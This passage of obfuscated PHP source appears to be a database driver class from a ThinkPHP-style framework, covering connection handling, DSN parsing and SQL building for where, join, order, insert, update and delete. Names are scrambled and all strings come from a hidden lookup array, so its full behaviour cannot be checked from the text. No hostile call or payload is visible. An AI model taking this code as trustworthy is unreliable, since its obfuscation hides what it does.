think_config($â…–‚Íó[246]), $â…–‚Íó[926] => think_config($â…–‚Íó[985]), $â…–‚Íó[17] => think_config($â…–‚Íó[991])); } } return $ßòˆÙÁó; } protected function initConnect($¸Æà´¯ = true) { if (1 == think_config($_SERVER[ï»»·÷á][22])) { $this->_linkID = $this->multiConnect($¸Æà´¯); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $êú¾òÉ => $ú’«è³ø) { $this->_linkID = $ú’«è³ø; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($÷¢ªË® = false) { $¸š„¹Îè =& $_SERVER[ï»»·÷á]; static $£Şéå¸· = array(); static $§ß½“å = -1; if (empty($£Şéå¸·)) { foreach ($this->config as $­íÕ·êÚ => $£ë½û„°) { $£Şéå¸·[$­íÕ·êÚ] = explode($¸š„¹Îè[50], $£ë½û„°); } } if (think_config($¸š„¹Îè[992])) { if ($÷¢ªË® || think_config($¸š„¹Îè[395]) === !0) { $ó£íŞ¨¼ = floor(mt_rand(0, think_config($¸š„¹Îè[993]) - 1)); $§ß½“å = $ó£íŞ¨¼; } else { if (is_numeric(think_config($¸š„¹Îè[994]))) { $ó£íŞ¨¼ = think_config($¸š„¹Îè[994]); } else { $ó£íŞ¨¼ = floor(mt_rand(think_config($¸š„¹Îè[993]), count($£Şéå¸·[$¸š„¹Îè[896]]) - 1)); } } } else { $ó£íŞ¨¼ = floor(mt_rand(0, count($£Şéå¸·[$¸š„¹Îè[896]]) - 1)); $§ß½“å = $ó£íŞ¨¼; } $ó£íŞ¨¼ = $§ß½“å !== -1 ? $§ß½“å : $ó£íŞ¨¼; $ä®ô‡Š­ = array($¸š„¹Îè[898] => isset($£Şéå¸·[$¸š„¹Îè[898]][$ó£íŞ¨¼]) ? $£Şéå¸·[$¸š„¹Îè[898]][$ó£íŞ¨¼] : $£Şéå¸·[$¸š„¹Îè[898]][0], $¸š„¹Îè[899] => isset($£Şéå¸·[$¸š„¹Îè[899]][$ó£íŞ¨¼]) ? $£Şéå¸·[$¸š„¹Îè[899]][$ó£íŞ¨¼] : $£Şéå¸·[$¸š„¹Îè[899]][0], $¸š„¹Îè[896] => isset($£Şéå¸·[$¸š„¹Îè[896]][$ó£íŞ¨¼]) ? $£Şéå¸·[$¸š„¹Îè[896]][$ó£íŞ¨¼] : $£Şéå¸·[$¸š„¹Îè[896]][0], $¸š„¹Îè[897] => isset($£Şéå¸·[$¸š„¹Îè[897]][$ó£íŞ¨¼]) ? $£Şéå¸·[$¸š„¹Îè[897]][$ó£íŞ¨¼] : $£Şéå¸·[$¸š„¹Îè[897]][0], $¸š„¹Îè[21] => isset($£Şéå¸·[$¸š„¹Îè[21]][$ó£íŞ¨¼]) ? $£Şéå¸·[$¸š„¹Îè[21]][$ó£íŞ¨¼] : $£Şéå¸·[$¸š„¹Îè[21]][0], $¸š„¹Îè[926] => isset($£Şéå¸·[$¸š„¹Îè[926]][$ó£íŞ¨¼]) ? $£Şéå¸·[$¸š„¹Îè[926]][$ó£íŞ¨¼] : $£Şéå¸·[$¸š„¹Îè[926]][0], $¸š„¹Îè[17] => isset($£Şéå¸·[$¸š„¹Îè[17]][$ó£íŞ¨¼]) ? $£Şéå¸·[$¸š„¹Îè[17]][$ó£íŞ¨¼] : $£Şéå¸·[$¸š„¹Îè[17]][0]); return $this->connect($ä®ô‡Š­, $ó£íŞ¨¼); } public function parseDSN($±¥îúÅ¼) { $æÃÓŠàâ =& $_SERVER[ï»»·÷á]; if (empty($±¥îúÅ¼)) { return !1; } $åªÚÑò = parse_url($±¥îúÅ¼); if ($åªÚÑò[$æÃÓŠàâ[181]]) { $¡ƒ¸¦´– = array($æÃÓŠàâ[971] => $åªÚÑò[$æÃÓŠàâ[181]], $æÃÓŠàâ[898] => isset($åªÚÑò[$æÃÓŠàâ[599]]) ? $åªÚÑò[$æÃÓŠàâ[599]] : $æÃÓŠàâ[12], $æÃÓŠàâ[899] => isset($åªÚÑò[$æÃÓŠàâ[995]]) ? $åªÚÑò[$æÃÓŠàâ[995]] : $æÃÓŠàâ[12], $æÃÓŠàâ[896] => isset($åªÚÑò[$æÃÓŠàâ[182]]) ? $åªÚÑò[$æÃÓŠàâ[182]] : $æÃÓŠàâ[12], $æÃÓŠàâ[897] => isset($åªÚÑò[$æÃÓŠàâ[183]]) ? $åªÚÑò[$æÃÓŠàâ[183]] : $æÃÓŠàâ[12], $æÃÓŠàâ[21] => isset($åªÚÑò[$æÃÓŠàâ[84]]) ? substr($åªÚÑò[$æÃÓŠàâ[84]], 1) : $æÃÓŠàâ[12]); } else { preg_match($æÃÓŠàâ[996], trim($±¥îúÅ¼), $ÊÆîÌ¿); $¡ƒ¸¦´– = array($æÃÓŠàâ[971] => $ÊÆîÌ¿[1], $æÃÓŠàâ[898] => $ÊÆîÌ¿[2], $æÃÓŠàâ[899] => $ÊÆîÌ¿[3], $æÃÓŠàâ[896] => $ÊÆîÌ¿[4], $æÃÓŠàâ[897] => $ÊÆîÌ¿[5], $æÃÓŠàâ[21] => $ÊÆîÌ¿[6]); } $¡ƒ¸¦´–[$æÃÓŠàâ[926]] = $æÃÓŠàâ[12]; return $¡ƒ¸¦´–; } protected function debug() { $²¬ìªŸ¹ =& $_SERVER[ï»»·÷á]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $²¬ìªŸ¹[997]; if (think_config($²¬ìªŸ¹[998])) { think_status($²¬ìªŸ¹[999]); think_trace($this->queryStr . $²¬ìªŸ¹[1000] . think_status($²¬ìªŸ¹[24], $²¬ìªŸ¹[999], 6) . $²¬ìªŸ¹[1001], $²¬ìªŸ¹[12], $²¬ìªŸ¹[1002]); } } protected function parseLock($¢Óù²ã = false) { $º±ô£È =& $_SERVER[ï»»·÷á]; if (!$¢Óù²ã) { return $º±ô£È[12]; } if ($º±ô£È[928] == $this->dbType) { return $º±ô£È[1003]; } return $º±ô£È[1004]; } protected function parseSet($ÇûŸé¯¿) { $±±éĞ¢² =& $_SERVER[ï»»·÷á]; foreach ($ÇûŸé¯¿ as $ëà“Ï¼î => $©¦ÖëĞ¾) { if (is_array($©¦ÖëĞ¾) && $±±éĞ¢²[297] == $©¦ÖëĞ¾[0]) { $ÑöùË‹¢[] = $this->parseKey($ëà“Ï¼î) . $±±éĞ¢²[894] . $©¦ÖëĞ¾[1]; } elseif (is_scalar($©¦ÖëĞ¾) || is_null($©¦ÖëĞ¾)) { $ÑöùË‹¢[] = $this->parseKey($ëà“Ï¼î) . $±±éĞ¢²[894] . $this->parseValue($©¦ÖëĞ¾); } } return $±±éĞ¢²[1005] . implode($±±éĞ¢²[50], $ÑöùË‹¢); } protected function bindParam($ÆËü÷©›, $±­¢ü) { $this->bind[$_SERVER[ï»»·÷á][4] . $ÆËü÷©›] = $±­¢ü; } protected function parseBind($å–›‘‚Ÿ) { $å–›‘‚Ÿ = array_merge($this->bind, $å–›‘‚Ÿ); $this->bind = array(); return $å–›‘‚Ÿ; } function parseKey(&$Ã ’–†÷, $à”ùÓÊ = true) { if ($à”ùÓÊ) { $Ã ’–†÷ = $this->parseKeyCheck($Ã ’–†÷); } return $Ã ’–†÷; } function parseKeyCheck($—îÌÄôŒ) { $²ö™íÒ =& $_SERVER[ï»»·÷á]; $—îÌÄôŒ = trim($—îÌÄôŒ); if (!preg_match($²ö™íÒ[1006], $—îÌÄôŒ)) { think_exception($²ö™íÒ[1007] . $—îÌÄôŒ); } return $—îÌÄôŒ; } protected function parseValue($ÖÌ€à‰) { $ŠÎÊŒÓ· =& $_SERVER[ï»»·÷á]; if (is_string($ÖÌ€à‰)) { $ÖÌ€à‰ = $ŠÎÊŒÓ·[967] . $this->escapeString($ÖÌ€à‰) . $ŠÎÊŒÓ·[967]; } elseif (isset($ÖÌ€à‰[0]) && is_string($ÖÌ€à‰[0]) && strtolower($ÖÌ€à‰[0]) == $ŠÎÊŒÓ·[297]) { $ÖÌ€à‰ = $this->escapeString($ÖÌ€à‰[1]); } elseif (is_array($ÖÌ€à‰)) { $ÖÌ€à‰ = array_map(array($this, $ŠÎÊŒÓ·[968]), $ÖÌ€à‰); } elseif (is_bool($ÖÌ€à‰)) { $ÖÌ€à‰ = $ÖÌ€à‰ ? $ŠÎÊŒÓ·[88] : $ŠÎÊŒÓ·[198]; } elseif (is_null($ÖÌ€à‰)) { $ÖÌ€à‰ = $ŠÎÊŒÓ·[103]; } return $ÖÌ€à‰; } protected function parseField($Å„Íãøô) { $ˆ“²˜•Ö =& $_SERVER[ï»»·÷á]; if (is_string($Å„Íãøô) && strpos($Å„Íãøô, $ˆ“²˜•Ö[50])) { $Å„Íãøô = explode($ˆ“²˜•Ö[50], $Å„Íãøô); } if (is_array($Å„Íãøô)) { $öÊ½¹Ÿå = array(); foreach ($Å„Íãøô as $Ç‘¬ŞßÑ => $¶×ß–¯é) { if (!is_numeric($Ç‘¬ŞßÑ)) { $öÊ½¹Ÿå[] = $this->parseKey($Ç‘¬ŞßÑ, !1) . $ˆ“²˜•Ö[1008] . $this->parseKey($¶×ß–¯é); } else { $öÊ½¹Ÿå[] = $this->parseKey($¶×ß–¯é); } } $Â«÷Õ¹Ò = implode($ˆ“²˜•Ö[50], $öÊ½¹Ÿå); } elseif (is_string($Å„Íãøô) && !empty($Å„Íãøô)) { $Â«÷Õ¹Ò = $Å„Íãøô; } else { $Â«÷Õ¹Ò = $ˆ“²˜•Ö[189]; } return $Â«÷Õ¹Ò; } protected function parseTable($»¶­÷Êæ) { $´™ë†¸€ =& $_SERVER[ï»»·÷á]; if (is_array($»¶­÷Êæ)) { $„º¯ ¨ = array(); foreach ($»¶­÷Êæ as $çÁ•¬…ã => $¾˜ÒÍÔÌ) { if (!is_numeric($çÁ•¬…ã)) { $„º¯ ¨[] = $this->parseKey($çÁ•¬…ã) . $´™ë†¸€[53] . $this->parseKey($¾˜ÒÍÔÌ); } else { $„º¯ ¨[] = $this->parseKey($çÁ•¬…ã); } } $»¶­÷Êæ = $„º¯ ¨; } elseif (is_string($»¶­÷Êæ)) { if (strstr($»¶­÷Êæ, $´™ë†¸€[53])) { return $»¶­÷Êæ; } $»¶­÷Êæ = explode($´™ë†¸€[50], $»¶­÷Êæ); array_walk($»¶­÷Êæ, array($this, $´™ë†¸€[916])); } return $´™ë†¸€[910] . trim(implode($´™ë†¸€[1009], $»¶­÷Êæ), $´™ë†¸€[385]) . $´™ë†¸€[910]; } protected function parseWhere($óØêä·€) { $À±›àšÀ =& $_SERVER[ï»»·÷á]; $¿Ì¨‘–Ü = $À±›àšÀ[12]; if (is_string($óØêä·€)) { $¿Ì¨‘–Ü = $óØêä·€; } else { $óÓ±¢ ² = isset($óØêä·€[$À±›àšÀ[1010]]) ? strtoupper($óØêä·€[$À±›àšÀ[1010]]) : $À±›àšÀ[12]; if (in_array($óÓ±¢ ², array($À±›àšÀ[1011], $À±›àšÀ[1012], $À±›àšÀ[1013]))) { $óÓ±¢ ² = $À±›àšÀ[53] . $óÓ±¢ ² . $À±›àšÀ[53]; unset($óØêä·€[$À±›àšÀ[1010]]); } else { $óÓ±¢ ² = $À±›àšÀ[1014]; } foreach ($óØêä·€ as $€’šÓı÷ => $ÌÆ”Û×’) { $¿Ì¨‘–Ü .= $À±›àšÀ[277]; if (is_numeric($€’šÓı÷)) { $€’šÓı÷ = $À±›àšÀ[1015]; } if (0 === strpos($€’šÓı÷, $À±›àšÀ[11])) { $¿Ì¨‘–Ü .= $this->parseThinkWhere($€’šÓı÷, $ÌÆ”Û×’); } else { if (!preg_match($À±›àšÀ[1016], trim($€’šÓı÷))) { think_exception(think_lang($À±›àšÀ[1017]) . $À±›àšÀ[4] . $€’šÓı÷); } $—ğêŒ§Ì = is_array($ÌÆ”Û×’) && isset($ÌÆ”Û×’[$À±›àšÀ[1018]]); $€’šÓı÷ = trim($€’šÓı÷); if (strpos($€’šÓı÷, $À±›àšÀ[283])) { $ñ÷ÁœÙÁ = explode($À±›àšÀ[283], $€’šÓı÷); $Çà™¼Ú™ = array(); foreach ($ñ÷ÁœÙÁ as $‚ÑÑ’çŠ => $ÆœçÄ‚é) { $¸äŞÂãí = $—ğêŒ§Ì ? $ÌÆ”Û×’[$‚ÑÑ’çŠ] : $ÌÆ”Û×’; $Çà™¼Ú™[] = $À±›àšÀ[260] . $this->parseWhereItem($this->parseKey($ÆœçÄ‚é), $¸äŞÂãí) . $À±›àšÀ[915]; } $¿Ì¨‘–Ü .= implode($À±›àšÀ[1019], $Çà™¼Ú™); } elseif (strpos($€’šÓı÷, $À±›àšÀ[284])) { $ñ÷ÁœÙÁ = explode($À±›àšÀ[284], $€’šÓı÷); $Çà™¼Ú™ = array(); foreach ($ñ÷ÁœÙÁ as $‚ÑÑ’çŠ => $ÆœçÄ‚é) { $¸äŞÂãí = $—ğêŒ§Ì ? $ÌÆ”Û×’[$‚ÑÑ’çŠ] : $ÌÆ”Û×’; $Çà™¼Ú™[] = $À±›àšÀ[260] . $this->parseWhereItem($this->parseKey($ÆœçÄ‚é), $¸äŞÂãí) . $À±›àšÀ[915]; } $¿Ì¨‘–Ü .= implode($À±›àšÀ[1014], $Çà™¼Ú™); } else { $¿Ì¨‘–Ü .= $this->parseWhereItem($this->parseKey($€’šÓı÷), $ÌÆ”Û×’); } } $¿Ì¨‘–Ü .= $À±›àšÀ[278] . $óÓ±¢ ²; } $¿Ì¨‘–Ü = substr($¿Ì¨‘–Ü, 0, -strlen($óÓ±¢ ²)); } return empty($¿Ì¨‘–Ü) ? $À±›àšÀ[12] : $À±›àšÀ[1020] . $¿Ì¨‘–Ü; } protected function parseWhereItem($ë‚†Èòö, $õáÑë ) { $¹Ç¢ñí =& $_SERVER[ï»»·÷á]; $ÉÓ‘—İ¦ = $¹Ç¢ñí[12]; if (is_array($õáÑë )) { if (is_string($õáÑë [0])) { $ş¿áçĞ± = strtolower($õáÑë [0]); if (in_array($õáÑë [0], array($¹Ç¢ñí[894], $¹Ç¢ñí[1021], $¹Ç¢ñí[1022], $¹Ç¢ñí[1023], $¹Ç¢ñí[1024], $¹Ç¢ñí[1025]))) { $ÉÓ‘—İ¦ .= $ë‚†Èòö . $¹Ç¢ñí[53] . $õáÑë [0] . $¹Ç¢ñí[53] . $this->parseValue($õáÑë [1]); } elseif (preg_match($¹Ç¢ñí[1026], $õáÑë [0])) { $ÉÓ‘—İ¦ .= $ë‚†Èòö . $¹Ç¢ñí[53] . $this->exp[$ş¿áçĞ±] . $¹Ç¢ñí[53] . $this->parseValue($õáÑë [1]); } elseif (preg_match($¹Ç¢ñí[1027], $õáÑë [0])) { if (is_array($õáÑë [1])) { $À¯Õ×­Â = isset($õáÑë [2]) ? strtoupper($õáÑë [2]) : $¹Ç¢ñí[1012]; if (in_array($À¯Õ×­Â, array($¹Ç¢ñí[1011], $¹Ç¢ñí[1012], $¹Ç¢ñí[1013]))) { $›ªÚ…İ = array(); foreach ($õáÑë [1] as $—¤ŒæÎ) { $›ªÚ…İ[] = $ë‚†Èòö . $¹Ç¢ñí[53] . $this->exp[$ş¿áçĞ±] . $¹Ç¢ñí[53] . $this->parseValue($—¤ŒæÎ); } $ÉÓ‘—İ¦ .= $¹Ç¢ñí[260] . implode($¹Ç¢ñí[53] . $À¯Õ×­Â . $¹Ç¢ñí[53], $›ªÚ…İ) . $¹Ç¢ñí[915]; } } else { $ÉÓ‘—İ¦ .= $ë‚†Èòö . $¹Ç¢ñí[53] . $this->exp[$ş¿áçĞ±] . $¹Ç¢ñí[53] . $this->parseValue($õáÑë [1]); } } elseif ($¹Ç¢ñí[297] == $ş¿áçĞ±) { $ÉÓ‘—İ¦ .= $¹Ç¢ñí[913] . $ë‚†Èòö . $¹Ç¢ñí[53] . $õáÑë [1] . $¹Ç¢ñí[1028]; } elseif (preg_match($¹Ç¢ñí[1029], $õáÑë [0])) { $ÉÓ‘—İ¦ .= $õáÑë [0]; } elseif (preg_match($¹Ç¢ñí[1030], $õáÑë [0])) { if (isset($õáÑë [2]) && $¹Ç¢ñí[297] == $õáÑë [2]) { $ÉÓ‘—İ¦ .= $ë‚†Èòö . $¹Ç¢ñí[53] . $this->exp[$ş¿áçĞ±] . $¹Ç¢ñí[53] . $õáÑë [1]; } else { if (is_string($õáÑë [1])) { $õáÑë [1] = explode($¹Ç¢ñí[50], $õáÑë [1]); } $ŒÑŞõöä = implode($¹Ç¢ñí[50], $this->parseValue($õáÑë [1])); $ÉÓ‘—İ¦ .= $ë‚†Èòö . $¹Ç¢ñí[53] . $this->exp[$ş¿áçĞ±] . $¹Ç¢ñí[913] . $ŒÑŞõöä . $¹Ç¢ñí[915]; } } elseif (preg_match($¹Ç¢ñí[1031], $õáÑë [0])) { $¤ì“¹Šè = is_string($õáÑë [1]) ? explode($¹Ç¢ñí[50], $õáÑë [1]) : $õáÑë [1]; $ÉÓ‘—İ¦ .= $¹Ç¢ñí[913] . $ë‚†Èòö . $¹Ç¢ñí[53] . $this->exp[$ş¿áçĞ±] . $¹Ç¢ñí[53] . $this->parseValue($¤ì“¹Šè[0]) . $¹Ç¢ñí[1014] . $this->parseValue($¤ì“¹Šè[1]) . $¹Ç¢ñí[278]; } else { think_exception(think_lang($¹Ç¢ñí[1017]) . $¹Ç¢ñí[4] . $õáÑë [0]); } } else { $ÔÀú¿Ë¼ = count($õáÑë ); $™¦Ì™Ìñ = $¹Ç¢ñí[12]; if (is_string($õáÑë [$ÔÀú¿Ë¼ - 1])) { $™¦Ì™Ìñ = isset($õáÑë [$ÔÀú¿Ë¼ - 1]) ? strtoupper($õáÑë [$ÔÀú¿Ë¼ - 1]) : $¹Ç¢ñí[12]; if (in_array($™¦Ì™Ìñ, array($¹Ç¢ñí[1011], $¹Ç¢ñí[1012], $¹Ç¢ñí[1013]))) { $ÔÀú¿Ë¼ = $ÔÀú¿Ë¼ - 1; } } else { $™¦Ì™Ìñ = $¹Ç¢ñí[1011]; } for ($¦ıí¯» = 0; $¦ıí¯» < $ÔÀú¿Ë¼; $¦ıí¯»++) { $¤ì“¹Šè = is_array($õáÑë [$¦ıí¯»]) ? $õáÑë [$¦ıí¯»][1] : $õáÑë [$¦ıí¯»]; if ($¹Ç¢ñí[297] == strtolower($õáÑë [$¦ıí¯»][0])) { $ÉÓ‘—İ¦ .= $¹Ç¢ñí[260] . $ë‚†Èòö . $¹Ç¢ñí[53] . $¤ì“¹Šè . $¹Ç¢ñí[1028] . $™¦Ì™Ìñ . $¹Ç¢ñí[53]; } else { $˜Şªğ¢ = is_array($õáÑë [$¦ıí¯»]) ? $this->exp[strtolower($õáÑë [$¦ıí¯»][0])] : $¹Ç¢ñí[894]; if (!$˜Şªğ¢ && is_array($õáÑë [$¦ıí¯»]) && in_array($õáÑë [$¦ıí¯»][0], array($¹Ç¢ñí[894], $¹Ç¢ñí[1021], $¹Ç¢ñí[1022], $¹Ç¢ñí[1023], $¹Ç¢ñí[1024], $¹Ç¢ñí[1025]))) { $˜Şªğ¢ = $õáÑë [$¦ıí¯»][0]; } $ÉÓ‘—İ¦ .= $¹Ç¢ñí[260] . $ë‚†Èòö . $¹Ç¢ñí[53] . $˜Şªğ¢ . $¹Ç¢ñí[53] . $this->parseValue($¤ì“¹Šè) . $¹Ç¢ñí[1028] . $™¦Ì™Ìñ . $¹Ç¢ñí[53]; } } $ÉÓ‘—İ¦ = substr($ÉÓ‘—İ¦, 0, -4); } } else { $ÉÓ‘—İ¦ .= $ë‚†Èòö . $¹Ç¢ñí[1032] . $this->parseValue($õáÑë ); } return $ÉÓ‘—İ¦; } protected function parseThinkWhere($ˆ…ÉûÄ, $­³ıİ¼) { $›ÈÑıÒ¥ =& $_SERVER[ï»»·÷á]; $¥“†¦° = $›ÈÑıÒ¥[12]; switch ($ˆ…ÉûÄ) { case $›ÈÑıÒ¥[352]: $¥“†¦° = $­³ıİ¼; break; case $›ÈÑıÒ¥[1015]: $¥“†¦° = is_string($­³ıİ¼) ? $­³ıİ¼ : substr($this->parseWhere($­³ıİ¼), 6); break; case $›ÈÑıÒ¥[1033]: parse_str($­³ıİ¼, $÷éÆ‰À”); if (isset($÷éÆ‰À”[$›ÈÑıÒ¥[1010]])) { $ï¨Ô¿ºÍ = $›ÈÑıÒ¥[53] . strtoupper($÷éÆ‰À”[$›ÈÑıÒ¥[1010]]) . $›ÈÑıÒ¥[53]; unset($÷éÆ‰À”[$›ÈÑıÒ¥[1010]]); } else { $ï¨Ô¿ºÍ = $›ÈÑıÒ¥[1014]; } $Şú”‚¦ = array(); foreach ($÷éÆ‰À” as $½É™­àù => $İƒ¿×ô) { $Şú”‚¦[] = $this->parseKey($½É™­àù) . $›ÈÑıÒ¥[1032] . $this->parseValue($İƒ¿×ô); } $¥“†¦° = implode($ï¨Ô¿ºÍ, $Şú”‚¦); break; } return $¥“†¦°; } protected function parseLimit($¬å­Ïİ€) { $Ôı‹û¥™ =& $_SERVER[ï»»·÷á]; return !empty($¬å­Ïİ€) ? $Ôı‹û¥™[51] . $¬å­Ïİ€ . $Ôı‹û¥™[53] : $Ôı‹û¥™[12]; } protected function parseJoin($Ô•ù³ôø) { $µşäÙ›Û =& $_SERVER[ï»»·÷á]; $ìá„—’ß = $µşäÙ›Û[12]; if (!empty($Ô•ù³ôø)) { if (is_array($Ô•ù³ôø)) { foreach ($Ô•ù³ôø as $Úµ©÷“ => $…“×Ã±) { if (!1 !== stripos($…“×Ã±, $µşäÙ›Û[1034])) { $ìá„—’ß .= $µşäÙ›Û[53] . $…“×Ã±; } else { $ìá„—’ß .= $µşäÙ›Û[1035] . $…“×Ã±; } } } else { $ìá„—’ß .= $µşäÙ›Û[1035] . $Ô•ù³ôø; } } $ìá„—’ß = preg_replace($µşäÙ›Û[1036], think_config($µşäÙ›Û[940]) . $µşäÙ›Û[1037], $ìá„—’ß); return $ìá„—’ß; } protected function parseOrder($Œùë¾›ç) { $Œïì¦¡‚ =& $_SERVER[ï»»·÷á]; if (is_array($Œùë¾›ç)) { $˜·ß‚ïÑ = array(); foreach ($Œùë¾›ç as $£¯”»ë² => $ş÷…ÏíØ) { if (is_numeric($£¯”»ë²)) { $˜·ß‚ïÑ[] = $this->parseKey($ş÷…ÏíØ); } else { $ş÷…ÏíØ = in_array(strtoupper(trim($ş÷…ÏíØ)), array($Œïì¦¡‚[1038], $Œïì¦¡‚[1039])) ? $Œïì¦¡‚[53] . $ş÷…ÏíØ : $Œïì¦¡‚[12]; if (preg_match($Œïì¦¡‚[1040], $£¯”»ë²)) { $˜·ß‚ïÑ[] = $this->parseKey($£¯”»ë²) . $ş÷…ÏíØ; } else { think_exception($Œïì¦¡‚[1041] . $£¯”»ë²); } } } $Œùë¾›ç = implode($Œïì¦¡‚[50], $˜·ß‚ïÑ); } return !empty($Œùë¾›ç) ? $Œïì¦¡‚[1042] . $Œùë¾›ç : $Œïì¦¡‚[12]; } protected function parseGroup($í¡‡ÑŸ) { $ô‰Ğáä =& $_SERVER[ï»»·÷á]; return !empty($í¡‡ÑŸ) ? $ô‰Ğáä[1043] . $í¡‡ÑŸ : $ô‰Ğáä[12]; } protected function parseHaving($Æ¼·ÛÙ) { $¥àºá =& $_SERVER[ï»»·÷á]; return !empty($Æ¼·ÛÙ) ? $¥àºá[1044] . $Æ¼·ÛÙ : $¥àºá[12]; } protected function parseComment($¤®À¶…³) { $Á£„¡ºÂ =& $_SERVER[ï»»·÷á]; return !empty($¤®À¶…³) ? $Á£„¡ºÂ[1045] . $¤®À¶…³ . $Á£„¡ºÂ[1046] : $Á£„¡ºÂ[12]; } protected function parseDistinct($¥Ì´§Ø”) { $‘ºæó¸« =& $_SERVER[ï»»·÷á]; return !empty($¥Ì´§Ø”) ? $‘ºæó¸«[1047] : $‘ºæó¸«[12]; } protected function parseUnion($ôÄ†Š ‰) { $™Û‘²ª =& $_SERVER[ï»»·÷á]; if (empty($ôÄ†Š ‰)) { return $™Û‘²ª[12]; } if (isset($ôÄ†Š ‰[$™Û‘²ª[348]])) { $ÉÓ¶ŠŸÖ = $™Û‘²ª[1048]; unset($ôÄ†Š ‰[$™Û‘²ª[348]]); } else { $ÉÓ¶ŠŸÖ = $™Û‘²ª[1049]; } foreach ($ôÄ†Š ‰ as $İË¶÷êĞ) { $û„Öí¥„[] = $ÉÓ¶ŠŸÖ . (is_array($İË¶÷êĞ) ? $this->buildSelectSql($İË¶÷êĞ) : $İË¶÷êĞ); } return implode($™Û‘²ª[53], $û„Öí¥„); } public function insert($ÕÌ½¹ºı, $ß†Ğà°ì = array(), $ä›†õ²‚ = false) { $Íîõ‚Ôú =& $_SERVER[ï»»·÷á]; $ÒªÅ¦Ş = $Ç’Ÿ‘¿ = array(); $this->model = $ß†Ğà°ì[$Íîõ‚Ôú[281]]; foreach ($ÕÌ½¹ºı as $ÊÀüÀ–ƒ => $ˆâ‡¤á) { if (is_array($ˆâ‡¤á) && $Íîõ‚Ôú[297] == $ˆâ‡¤á[0]) { $Ç’Ÿ‘¿[] = $this->parseKey($ÊÀüÀ–ƒ); $ÒªÅ¦Ş[] = $ˆâ‡¤á[1]; } elseif (is_scalar($ˆâ‡¤á) || is_null($ˆâ‡¤á)) { $Ç’Ÿ‘¿[] = $this->parseKey($ÊÀüÀ–ƒ); $ÒªÅ¦Ş[] = $this->parseValue($ˆâ‡¤á); } } $ÕÚ¬ŒëÑ = ($ä›†õ²‚ ? $Íîõ‚Ôú[917] : $Íîõ‚Ôú[918]) . $Íîõ‚Ôú[919] . $this->parseTable($ß†Ğà°ì[$Íîõ‚Ôú[279]]) . $Íîõ‚Ôú[913] . implode($Íîõ‚Ôú[50], $Ç’Ÿ‘¿) . $Íîõ‚Ôú[914] . implode($Íîõ‚Ôú[50], $ÒªÅ¦Ş) . $Íîõ‚Ôú[915]; $ÕÚ¬ŒëÑ .= $this->parseLock(isset($ß†Ğà°ì[$Íîõ‚Ôú[856]]) ? $ß†Ğà°ì[$Íîõ‚Ôú[856]] : !1); $ÕÚ¬ŒëÑ .= $this->parseComment(!empty($ß†Ğà°ì[$Íîõ‚Ôú[354]]) ? $ß†Ğà°ì[$Íîõ‚Ôú[354]] : $Íîõ‚Ôú[12]); return $this->execute($ÕÚ¬ŒëÑ, $this->parseBind(!empty($ß†Ğà°ì[$Íîõ‚Ôú[285]]) ? $ß†Ğà°ì[$Íîõ‚Ôú[285]] : array())); } public function selectInsert($‚ç…Óä, $ã‡ “×ò, $ÌıÅà™ = array()) { $°Ã´ÄËÜ =& $_SERVER[ï»»·÷á]; $this->model = $ÌıÅà™[$°Ã´ÄËÜ[281]]; if (is_string($‚ç…Óä)) { $‚ç…Óä = explode($°Ã´ÄËÜ[50], $‚ç…Óä); } array_walk($‚ç…Óä, array($this, $°Ã´ÄËÜ[916])); $ãÂæ·®Ü = $°Ã´ÄËÜ[1050] . $this->parseTable($ã‡ “×ò) . $°Ã´ÄËÜ[913] . implode($°Ã´ÄËÜ[50], $‚ç…Óä) . $°Ã´ÄËÜ[1028]; $ãÂæ·®Ü .= $this->buildSelectSql($ÌıÅà™); return $this->execute($ãÂæ·®Ü, $this->parseBind(!empty($ÌıÅà™[$°Ã´ÄËÜ[285]]) ? $ÌıÅà™[$°Ã´ÄËÜ[285]] : array())); } public function update($²Œ˜ã…ş, $óÄ²“¾Š) { $ôÇéğëä =& $_SERVER[ï»»·÷á]; $this->model = $óÄ²“¾Š[$ôÇéğëä[281]]; $®Ì­ÕªĞ = $ôÇéğëä[1051] . $this->parseTable($óÄ²“¾Š[$ôÇéğëä[279]]) . $this->parseSet($²Œ˜ã…ş) . $this->parseWhere(!empty($óÄ²“¾Š[$ôÇéğëä[275]]) ? $óÄ²“¾Š[$ôÇéğëä[275]] : $ôÇéğëä[12]) . $this->parseOrder(!empty($óÄ²“¾Š[$ôÇéğëä[365]]) ? $óÄ²“¾Š[$ôÇéğëä[365]] : $ôÇéğëä[12]) . $this->parseLimit(!empty($óÄ²“¾Š[$ôÇéğëä[292]]) ? $óÄ²“¾Š[$ôÇéğëä[292]] : $ôÇéğëä[12]) . $this->parseLock(isset($óÄ²“¾Š[$ôÇéğëä[856]]) ? $óÄ²“¾Š[$ôÇéğëä[856]] : !1) . $this->parseComment(!empty($óÄ²“¾Š[$ôÇéğëä[354]]) ? $óÄ²“¾Š[$ôÇéğëä[354]] : $ôÇéğëä[12]); return $this->execute($®Ì­ÕªĞ, $this->parseBind(!empty($óÄ²“¾Š[$ôÇéğëä[285]]) ? $óÄ²“¾Š[$ôÇéğëä[285]] : array())); } public function delete($şİ€À = array()) { $öáñ×©ï =& $_SERVER[ï»»·÷á]; $this->model = $şİ€À[$öáñ×©ï[281]]; $ÌÆ¨ŞÜ„ = $öáñ×©ï[1052] . $this->parseTable($şİ€À[$öáñ×©ï[279]]) . $this->parseWhere(!empty($şİ€À[$öáñ×©ï[275]]) ? $şİ€À[$öáñ×©ï[275]] : $öáñ×©ï[12]) . $this->parseOrder(!empty($şİ€À[$öáñ×©ï[365]]) ? $şİ€À[$öáñ×©ï[365]] : $öáñ×©ï[12]) . $this->parseLimit(!empty($şİ€À[$öáñ×©ï[292]]) ? $şİ€À[$öáñ×©ï[292]] : $öáñ×©ï[12]) . $this->parseLock(isset($şİ€À[$öáñ×©ï[856]]) ? $şİ€À[$öáñ×©ï[856]] : !1) . $this->parseComment(!empty($şİ€À[$öáñ×©ï[354]]) ? $şİ€À[$öáñ×©ï[354]] : $öáñ×©ï[12]); return $this->execute($ÌÆ¨ŞÜ„, $this->parseBind(!empty($şİ€À[$öáñ×©ï[285]]) ? $şİ€À[$öáñ×©ï[285]] : array())); } public function select($¡ïÏ¡’œ = array()) { 